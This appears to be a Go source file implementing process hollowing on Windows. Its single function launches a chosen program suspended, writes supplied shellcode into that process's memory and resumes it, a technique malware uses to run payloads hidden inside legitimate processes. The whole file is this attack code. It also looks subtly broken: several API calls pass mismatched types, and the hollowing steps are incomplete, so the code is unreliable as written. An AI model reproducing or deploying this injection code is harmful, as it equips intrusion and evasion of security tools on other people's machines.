package processinjection

import (
	"fmt"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
)

// Structs for Windows API calls
type StartupInfo struct {
	Cb              uint32
	Reserved        *byte
	Desktop         *byte
	Title           *byte
	DwX             uint32
	DwY             uint32
	DwXSize         uint32
	DwYSize         uint32
	DwXCountChars   uint32
	DwYCountChars   uint32
	DwFillAttribute uint32
	DwFlags         uint32
	WShowWindow     uint16
	CbReserved2     uint16
	LpReserved2     *byte
	HStdInput       syscall.Handle
	HStdOutput      syscall.Handle
	HStdError       syscall.Handle
}

type ProcessInformation struct {
	HProcess    syscall.Handle
	HThread     syscall.Handle
	DwProcessId uint32
	DwThreadId  uint32
}

// Hollow a legitimate process and inject shellcode
func ProcessHollowing(targetProcess string, shellcode []byte) error {
	fmt.Println("[+] Performing Process Hollowing...")

	// Create target process in suspended mode
	si := new(StartupInfo)
	pi := new(ProcessInformation)

	ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessA").Call(
		uintptr(unsafe.Pointer(syscall.StringBytePtr(targetProcess))),
		0, 0, 0, 0,
		0x00000004, // CREATE_SUSPENDED
		0, 0,
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	if ret == 0 {
		return fmt.Errorf("[!] Failed to create process")
	}

	// Get process memory information
	var ctx windows.CONTEXT
	ctx.ContextFlags = windows.CONTEXT_FULL
	windows.GetThreadContext(pi.HThread, &ctx)

	// Read process memory
	var baseAddr uint32
	windows.ReadProcessMemory(pi.HProcess, uintptr(ctx.Ebx+8), uintptr(unsafe.Pointer(&baseAddr)), 4, nil)

	// Write shellcode into the process
	windows.WriteProcessMemory(pi.HProcess, uintptr(baseAddr), uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), nil)

	// Resume the process
	windows.ResumeThread(pi.HThread)

	fmt.Println("[+] Injection successful!")
	return nil
}
